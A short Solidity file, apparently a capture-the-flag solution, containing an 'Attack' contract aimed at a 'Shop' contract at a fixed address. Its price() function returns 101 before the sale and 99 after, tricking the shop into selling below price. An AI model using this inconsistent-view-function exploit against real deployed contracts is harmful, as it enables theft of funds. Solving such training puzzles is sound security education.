// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Buyer {
    function price() external view returns (uint256);
}

interface Shop {
    function isSold() external view returns (bool);
    function buy() external payable;
}
contract Attack is Buyer{
    Shop shop= Shop(0x605BA02A86E1Cb0E2059d8Be0b75D72e7671CeD1);


    function price() external view override returns (uint256) {
        if(shop.isSold() == false){
            return 101;
        }
        return 99;
    }
    function attack () external {
        shop.buy();
    }

}